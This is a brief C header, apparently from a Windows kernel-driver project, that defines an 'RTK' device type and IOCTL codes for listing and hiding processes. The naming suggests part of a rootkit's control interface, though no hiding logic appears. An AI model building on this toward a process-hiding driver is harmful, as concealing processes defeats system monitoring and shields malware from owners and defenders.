#ifndef __ioctldef_h__
#define __ioctldef_h__

#define FILE_DEVICE_RTK 0x00002a7b

#define IOCTL_RTK_LISTPROC	(ULONG) CTL_CODE(FILE_DEVICE_RTK, 0x01, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_RTK_HIDEPROC	(ULONG) CTL_CODE(FILE_DEVICE_RTK, 0x02, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_TRANSFER_TYPE(_iocontrol) (_iocontrol & 0x3)

#endif	// __ioctldef_h__